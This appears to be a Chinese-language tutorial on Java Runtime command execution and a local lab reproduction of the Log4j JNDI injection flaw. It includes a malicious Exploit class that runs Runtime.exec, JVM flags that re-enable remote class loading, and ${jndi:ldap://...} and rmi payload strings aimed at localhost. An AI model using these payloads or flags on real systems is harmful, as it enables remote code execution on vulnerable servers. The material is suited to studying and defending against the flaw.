# 基于Runtime的Java远程命令执行
> 很多Java命令执行都是使用该知识点
>
> 如果`runtime` `exec`等关键词被绕过，可以使用Java反射机制来构成新的远程命令执行
>

## 无任何过滤的Runtime远程命令执行
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {}
}
```

```shell
# 编译成class字节码
javac Exploit.java
```

## 过滤了关键字的Runtime远程命令执行
> 待补充
>

# 漏洞复现前提
# Java版本问题
目前常用的都是`java1.8`，但是在一些需要远程 `JNDI/RMI RCE` 调用的时候，`JDK 1.8u191` 开始修复了 JNDI 注入的一些利用方式，默认禁用了从远程地址加载类。可以查看一下自己当前系统的Java环境版本。使用的命令为：

```shell
java -version
```

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750913764807-22321542-b806-4706-8f33-ac44783d9668.png)

当前我的系统存在两个Java版本，`JDK 1.8`和`JDK 17`。至于怎么知道自己JDK的具体版本。其对应如下：

`1.8.0_XXX` => `JDK 8uXXX`	Java 8 及之前版本命名方式

`17.0.15` => `JDK [主版本].[次版本].[补丁版本]`     Java 9 之后命名方式

例如我的系统环境对应如下：  

`openjdk version "1.8.0_452"`对应`JDK 1.8u452`

`openjdk version "17.0.15"`对应`JDK 17.0.15`

如果JDK版本>=`JDK 1.8u191`，可以`重新安装低版本的JDK`或者`添加 JVM 启动参数`。重新安装低版本的JDK就不说了，在这里说一下如何添加JVM的启动参数。

## 添加JVM的启动参数
通过添加如下的启动参数，可以自定义开启远程地址加载：

```shell
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
```

### 方案一（命令行运行时）
```shell
javac Exploit.java
java -Dcom.sun.jndi.rmi.object.trustURLCodebase=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=true Exploit
```

### 方案二（IDEA上测试时）
在IDEA的右上角编辑环境配置

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750914874597-4943ebe6-7476-45b4-befb-5a8217ec054c.png)

点击`Modify options`

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750914954210-97a03d2f-54e8-4920-b26e-f84ea7ff6377.png)

在下拉列表中选择`Add VM options`

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750915012037-c36df166-95a7-4d5b-843c-45b62bf0ca25.png)

最后添加上面的JVM参数应用即可

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750915088307-07009573-9d16-482a-b231-ffb1852b29e0.png)

# Log4j漏洞复现
本环境使用的是IDEA配合`JDK 1.8u452`、`log4j 2.14.1`进行复现，使用`maven`作为库管理。

```xml
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.14.1</version>
</dependency>
```

```java
package com.example.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {

    private static final Logger logger = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {
        String code = "${jndi:ldap://localhost:1389/Exploit}";
        logger.error("{}", code);
    }
}

```

使用上面编译好的`Exploit`字节码文件作为恶意类，借用JNDI GUI工具进行测试。

在Exploit字节码文件所在的路径下开启http服务，并同时开启ldap服务和rmi服务，可以使用 [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit.git) 或者 [marshalsec](https://github.com/mbechler/marshalsec.git) 工具。本文章是在本地复现且为了方便，使用自己开发的小工具：[JNDIInjectorGUI](https://github.com/Minshenyao/JNDIInjectorGUI.git)。

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750915473028-f076daf7-a637-41b9-9c89-d903d7b09e49.png)

然后运行Log4jTest.java代码进行测试：

成功执行了恶意类，弹出了计算器，如果测试rmi只需要更改11行代码为:

`String code = "${jndi:rmi://localhost:1099/Exploit}";`

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750915554276-a4e932ac-9473-4d26-9b10-1cc5b75680f8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/53790070/1750915710628-d9ef3263-0ab4-4836-a977-6965951ac27f.png)

# 总结
比较大众熟知的 Java 反序列化漏洞，比如 Fastjson、Jackson，这些库之前都被爆出过可以利用。基本上问题都是出在反序列化的时候，用户可以伪造或者替换原本应该反序列化的类，结果就执行了不该执行的代码。

我们可以利用 [ysoserial](https://github.com/frohoff/ysoserial.git) 工具来进行复现，它里面内置了很多漏洞利用方式，比如最出名的就是 cc 链，只要目标用了对应版本的依赖链，打起来就很顺。

